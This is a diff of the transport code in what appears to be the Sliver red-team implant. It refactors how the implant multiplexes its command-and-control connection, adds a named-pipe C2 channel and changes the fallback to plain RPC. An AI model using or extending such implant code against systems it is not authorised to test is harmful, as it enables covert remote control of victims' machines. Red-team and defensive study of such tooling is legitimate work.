@@ -19,8 +19,6 @@ package transports
 */
 
 import (
-	"crypto/rand"
-	"encoding/binary"
 	"errors"
 	"fmt"
 	"io"
@@ -36,51 +34,44 @@ import (
 	"github.com/bishopfox/sliver/sliver/3rdparty/ilgooz/bon"
 )
 
-// Transport - A wrapper around a physical connection, embedding what is necessary to
-// perform connection multiplexing, and RPC layer management around these muxed logical streams.
-// This allows to have different RPC-able streams for parallel work on an implant.
-// Also, these streams can be used to route any net.Conn traffic.
+// Transport - A wrapper around a physical connection, embedding what is necessary to perform connection
+// multiplexing, and RPC layer management around these muxed logical streams. This allows to have different
+// RPC-able streams for parallel work on an implant.
+// Also, these multiplexed streams can be used to route any net.Conn traffic.
+// Some transports use an underlying "physical connection" that is not/does not yield a
+// net.Conn stream, and are therefore unable to use much of the Transport infrastructure.
 type Transport struct {
-	ID uint64 // A unique ID for this transport.
-
-	// Depending on the underlying protocol stack used by this transport,
-	// we might or might not be able to do stream multiplexing. Generally,
-	// if IsMux is set to false, it is because the underlying protocol used
-	// is not able to yield us a net.Conn object, and therefore the conn below
-	// will also be empty.
-	IsMux bool
-
-	// conn - A Physical connection initiated by/on behalf of this transport.
-	// From this conn will be derived one or more streams for different purposes.
-	// This can be a tls.Conn, a tcp.Conn, a smtp.Conn, etc.
-	// In the case of TCP/UDP over HTTP (chisel-style), the transport has initiated
-	// a connection with a chisel-like server, with specific keep-alive, and has
-	// created a SSH-like conn on top of HTTP.
-	// This SSH conn would be this net.Conn, and therefore not being a physical connection.
-	conn net.Conn
-
-	// Multiplexer - Able to derive stream from the physical conn above. This
-	// transport being in the implant and the server being the one "ordering"
-	// to mux conns, we are in a server position here.
-	Multiplexer *yamux.Session
-
-	// C2 - The logical stream used, by default, to speak RPC with the server.
-	// Either setup on top of physical conn, or of a muxed stream. This can
-	// be nil when the transport is connected to another implant (here, we are a pivot.)
-	C2 *Connection
+	ID uint64
 
 	// URL is used by Sliver's code for CC servers.
 	URL *url.URL
 
-	// Inbound - Streams that have been created upon request of the
-	// Transport's other end: the C2 Server, an implant pivot, or reverse traffic.
-	// This channel is CONSUMED by the implant's routing system.
-	Inbound chan net.Conn
+	// If the underlying connection is not a net.Conn, we cannot multiplex it.
+	IsMux bool
 
-	// Router - For each connection that needs to be forwarded to the other end
+	// conn - A physical connection initiated by/on behalf of this transport.
+	// From this conn will be derived one or more streams for different purposes.
+	// Sometimes this conn is not a proper physical connection (like yielded by net.Dial)
+	// but it nonetheless plays the same role. This conn can be nil if the underlying
+	// "physical connection" does not yield a net.Conn.
+	conn net.Conn
+
+	// Multiplexer - Able to derive stream from the physical conn above.
+	Multiplexer *yamux.Session
+
+	// The RPC layer added around a net.Conn stream, used by implant to talk with the server.
+	// It is either setup on top of physical conn, or of a muxed stream.
+	// It can be nil if the Transport is tied to a pivoted implant.
+	// If the Transport is the ActiveConnection to the C2 server, this cannot
+	// be nil, as all underlying transports allow to register a RPC layer.
+	C2 *Connection
+
+	// Router - For each connection that needs to be forwarded to the Transport's other end,
 	// we use the Router to connect, specify the wished route of the connection, and pipe.
 	// Therefore, here the Router is in a client position most of the time.
 	Router *bon.Bon
+
+	Inbound chan net.Conn
 }
 
 // New - Eventually, we should have all supported transport transports being
@@ -120,9 +111,9 @@ ConnLoop:
 	for connectionAttempts < maxErrors {
 
 		// We might have several transport protocols available, while some
-		// of which being unable to stream multiplexing (ex: mTLS + DNS), so
+		// of which being unable to do stream multiplexing (ex: mTLS + DNS):
 		// we directly set up the C2 RPC layer here when needed, and we will
-		// skip the mux part below thanks to an if condition.
+		// skip the mux part below if needed.
 		switch t.URL.Scheme {
 		// {{if .Config.MTLSc2Enabled}}
 		case "mtls":
@@ -143,7 +134,7 @@ ConnLoop:
 				// {{end}}
 				connectionAttempts++
 			}
-			t.IsMux = true // mTLS is mux-compatible.
+			t.IsMux = true
 			break ConnLoop
 			// {{end}} - MTLSc2Enabled
 		case "dns":
@@ -155,7 +146,7 @@ ConnLoop:
 				// {{end}}
 				connectionAttempts++
 			}
-			t.IsMux = false // DNS is NOT mux-compatible.
+			t.IsMux = false
 			// {{end}} - DNSc2Enabled
 		case "https":
 			fallthrough
@@ -168,17 +159,27 @@ ConnLoop:
 				// {{end}}
 				connectionAttempts++
 			}
-			t.IsMux = false // Custom Sliver HTTP is NOT mux-compatible.
+			t.IsMux = false
 			// {{end}} - HTTPc2Enabled
+		case "namedpipe":
+			// {{if .Config.NamePipec2Enabled}}
+			t.conn, err = namePipeDial(t.URL)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[namedpipe] Connection failed %s", err)
+				// {{end}}
+				connectionAttempts++
+			}
+			t.IsMux = true
+			// {{end}} -NamePipec2Enabled
 		}
 	}
 
 	// If the underlying protocol stack allows us to do stream mux, set it up.
 	// If not, all C2 RPC layer is already set for this transport.
 	if t.IsMux {
-		// Inbound/outbound streams are initialized
-		t.Inbound = make(chan net.Conn, 100)
 
+		// The C2 server is here the yamux.Client requiring to open a session.
 		t.Multiplexer, err = yamux.Server(t.conn, nil)
 		if err != nil {
 			// {{if .Config.Debug}}
@@ -187,24 +188,48 @@ ConnLoop:
 			return t.phyConnFallBack()
 		}
 
-		// We start handling inbound/outbound streams in the background.
-		// Outbound streams, however, are drectly handled by Bon' routing handlers.
-		go t.handleInboundStreams()
+		// We wait for the first stream being instantiated over the connection
+		// and add the RPC layer to it. If an error arises or if we timeout, we
+		// fall back to wrapping the RPC around the transport's physical conn.
+		var inbound = make(chan net.Conn, 1)
+		var timedOut = make(chan struct{}, 1)
+		go func(timedOut chan struct{}) {
+			select {
+			default:
+				// {{if .Config.Debug}}
+				log.Printf("[mux] Waiting for CC to open C2 stream...")
+				// {{end}}
+				stream, _ := t.Multiplexer.Accept()
+				inbound <- stream
+				return
+			case <-timedOut:
+				return
+			}
+		}(timedOut)
 
-		// Add the C2 RPC layer on top of the first muxed stream of the comm.
-		t.C2, err = t.NewStreamC2()
-		if err != nil {
+		select {
+		case stream := <-inbound:
+			t.C2, err = t.SetupC2RPC(stream)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("Error: setting RPC C2: %s", err)
+				err = t.phyConnFallBack()
+			}
+		case <-time.After(defaultNetTimeout):
+			close(timedOut)
+			close(inbound)
 			// {{if .Config.Debug}}
-			log.Printf("Error: setting RPC C2: %s", err)
+			log.Printf("[mux] timed out waiting muxed stream for RPC C2 layer")
 			// {{end}}
-			return t.phyConnFallBack()
+			err = t.phyConnFallBack()
 		}
 	}
 
-	// Everything in the transport is set up and running.
+	// Everything in the transport is set up and running, including RPC layer.
 	// We now either send a registration envelope, or anything.
 	activeConnection = t.C2
 	activeC2 = t.URL.String()
+
 	// {{if .Config.Debug}}
 	log.Printf("Transport %d set up and running (%s)", t.ID, t.URL)
 	// {{end}}
@@ -213,8 +238,8 @@ ConnLoop:
 
 // StartFromConn - A net.Conn has been created out of a listener, and we
 // setup multiplexing infrastructure around it, without any RPC layer added.
-// Usually this function is called because we are here the pivot end:
-// we just have to route the traffic back to the C2 server (or next pivot).
+// This is used when this implant has a pivot listener started, and simply
+// needs to route the traffic coming from the pivoted implant.
 func (t *Transport) StartFromConn(conn net.Conn) (err error) {
 
 	// We fill details on this Transport
@@ -233,9 +258,8 @@ func (t *Transport) StartFromConn(conn net.Conn) (err error) {
 		// {{end}}
 	}
 
-	// Initiate first stream, used by remote end as C2 RPC stream.
-	// Then add it to inbound streams, which will be routed. Exceptionally,
-	// the transport is a client, relatively to another implant.
+	// As the server is a client when setting up C2 RPC stream, we act as the server
+	// and request to open a stream. The pivoted implant is listening for this.
 	stream, err := t.Multiplexer.Open()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -248,100 +272,85 @@ func (t *Transport) StartFromConn(conn net.Conn) (err error) {
 	log.Printf("Transport %d set up and running (%s <- %s)", t.ID, t.conn.LocalAddr(), t.conn.RemoteAddr())
 	// {{end}}
 
-	// Finally we handle all inbound/outbound streams in background
-	// Outbound streams, however, are drectly handled by Bon' routing handlers.
-	go t.handleInboundStreams()
-
 	return
 
 }
 
-// NewStreamC2 - The transports muxes the physical connection, adds a C2 RPC layer onto it,
-// starts all request handling goroutines, and returns this connection, if needed.
-// This function is used if we want to use this implant's RPC functionality concurrently.
-func (t *Transport) NewStreamC2() (c2 *Connection, err error) {
+// SetupC2RPC - Adds the RPC layer to the Transport, so that implant can talk to C2 server.
+// The stream parameter is not "tracked" or "registered" by ourselves, but we should need to.
+func (t *Transport) SetupC2RPC(stream net.Conn) (c2 *Connection, err error) {
+
+	if stream == nil {
+		return nil, errors.New("Attempted to setup RPC layer around nil net.Conn")
+	}
+
+	c2 = &Connection{
+		Send:    make(chan *pb.Envelope),
+		Recv:    make(chan *pb.Envelope),
+		ctrl:    make(chan bool),
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		IsOpen:  true,
+		cleanup: func() {
+			// {{if .Config.Debug}}
+			log.Printf("[RPC] lost connection/stream, cleaning up RPC...")
+			// {{end}}
+			close(c2.Send)
+			close(c2.Recv)
+			// In sliver we close the physical conn.
+			// Here we close the logical stream only.
+			stream.Close()
+		},
+	}
+
+	go func() {
+		defer c2.Cleanup()
+		for envelope := range c2.Send {
+			connWriteEnvelope(stream, envelope)
+		}
+	}()
+
+	go func() {
+		defer c2.Cleanup()
+		for {
+			envelope, err := connReadEnvelope(stream)
+			if err == io.EOF {
+				break
+			}
+			if err == nil {
+				c2.Recv <- envelope
+			}
+		}
+	}()
 
 	// {{if .Config.Debug}}
-	log.Printf("[mux] Waiting for CC to open C2 stream...")
+	log.Printf("Done creating RPC C2 stream.")
 	// {{end}}
 
-	// We wait for the first stream being instantiated over the conn, otherwise we timeout
-	select {
-	case stream := <-t.Inbound:
-		// Get net.Conn stream. This stream is not tracked by any mean latter on. For now only...
-		c2 = &Connection{
-			Send:    make(chan *pb.Envelope),
-			Recv:    make(chan *pb.Envelope),
-			ctrl:    make(chan bool),
-			tunnels: &map[uint64]*Tunnel{},
-			mutex:   &sync.RWMutex{},
-			once:    &sync.Once{},
-			IsOpen:  true,
-			cleanup: func() {
-				// {{if .Config.Debug}}
-				log.Printf("[mux] lost stream, cleaning up RPC...")
-				// {{end}}
-				close(c2.Send)
-				close(c2.Recv)
-				// In sliver we close the physical conn.
-				// Here we close the logical stream only.
-				stream.Close()
-			},
-		}
-
-		go func() {
-			defer c2.Cleanup()
-			for envelope := range c2.Send {
-				connWriteEnvelope(stream, envelope)
-			}
-		}()
-
-		go func() {
-			defer c2.Cleanup()
-			for {
-				envelope, err := connReadEnvelope(stream)
-				if err == io.EOF {
-					break
-				}
-				if err == nil {
-					c2.Recv <- envelope
-				}
-			}
-		}()
-
-		// {{if .Config.Debug}}
-		log.Printf("Done creating RPC C2 stream.")
-		// {{end}}
-
-	case <-time.After(defaultNetTimeout):
-		return nil, errors.New("timed out waiting muxed stream for RPC C2 layer")
-	}
 	return
 }
 
-// Stop - Gracefully shutdowns all components of this transport.
-// The force parameter is used in case we have a mux transport, and
-// that we want to kill it even if there are pending streams in it.
+// Stop - Gracefully shutdowns all components of this transport. The force parameter is used in case
+// we have a mux transport, and that we want to kill it even if there are pending streams in it.
 func (t *Transport) Stop(force bool) (err error) {
 
 	if t.IsMux {
-		activeStreams := t.Multiplexer.NumStreams()
-
-		// If there is an active C2, there is at least one open stream,
-		// that we do not count as "important" when stopping the Transport.
-		if (t.C2 != nil && activeStreams > 1) || (t.C2 == nil && activeStreams > 0) && !force {
-			return fmt.Errorf("Cannot stop transport: %d streams still opened", activeStreams)
+		if t.IsRouting() && !force {
+			return fmt.Errorf("Cannot stop transport: %d streams still opened", t.Multiplexer.NumStreams())
 		}
 
 		// {{if .Config.Debug}}
 		log.Printf("[mux] closing all muxed streams")
 		// {{end}}
+
 		err = t.Multiplexer.GoAway()
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("[mux] Error sending GoAway: %s", err)
 			// {{end}}
 		}
+
 		err = t.Multiplexer.Close()
 		// {{if .Config.Debug}}
 		log.Printf("[mux] Error closing session: %s", err)
@@ -362,42 +371,6 @@ func (t *Transport) Stop(force bool) (err error) {
 	return
 }
 
-// handleInboundStreams - A goroutine used to mux the connection in the background,
-// each time the client (Sliver C2 server) asks for a new separate stream.
-// These streams will be handled by the implant routing system.
-func (t *Transport) handleInboundStreams() {
-
-	defer func() {
-		close(t.Inbound)
-		// {{if .Config.Debug}}
-		log.Printf("[mux] Stopped processing inbound streams: ")
-		// {{end}}
-	}()
-
-	// {{if .Config.Debug}}
-	log.Printf("[mux] Starting inbound stream handling in background...")
-	// {{end}}
-	for {
-		select {
-		default:
-			stream, err := t.Multiplexer.Accept()
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("[mux] Error accepting C2 stream: %s", err)
-				// {{end}}
-				return
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[mux] Inbound stream: muxing conn")
-			// {{end}}
-			t.Inbound <- stream
-
-		case <-t.Multiplexer.CloseChan():
-			return
-		}
-	}
-}
-
 // HandleRouteStream - The transport is asked to route a stream given a route ID.
 // This function is called by Bon' routing handlers, once they have the routeID and the conn.
 func (t *Transport) HandleRouteStream(routeID uint32, src net.Conn) (err error) {
@@ -412,22 +385,38 @@ func (t *Transport) HandleRouteStream(routeID uint32, src net.Conn) (err error) 
 	log.Printf("[mux] Outbound stream: muxing conn and piping")
 	// {{end}}
 
-	transport(src, dst)
-	// go transport(src, dst)
+	transport(src, dst) // Pipe connection
+
 	return
 }
 
 // In case we failed to use multiplexing infrastructure, we call here
 // to downgrade to RPC over the transport's physical connection.
 func (t *Transport) phyConnFallBack() (err error) {
+
 	// {{if .Config.Debug}}
 	log.Printf("[mux] falling back on RPC around physical conn")
 	// {{end}}
 
 	// First make sure all mux code is cleanup correctly.
-	t.IsMux = false
+	if t.Multiplexer != nil {
+		err = t.Multiplexer.GoAway()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("[mux] Error sending GoAway: %s", err)
+			// {{end}}
+		}
 
-	// Wrap RPC layer around physical conn here.
+		err = t.Multiplexer.Close()
+		// {{if .Config.Debug}}
+		log.Printf("[mux] Error closing session: %s", err)
+		// {{end}}
+
+		t.IsMux = false
+	}
+
+	// Wrap RPC layer around physical conn.
+	t.C2, err = t.SetupC2RPC(t.conn)
 
 	return
 }
@@ -498,9 +487,3 @@ var (
 	mediumBufferSize = 8 * 1024  // 8KB medium buffer
 	largeBufferSize  = 32 * 1024 // 32KB large buffer
 )
-
-func newID() uint64 {
-	randBuf := make([]byte, 8)
-	rand.Read(randBuf)
-	return binary.LittleEndian.Uint64(randBuf)
-}
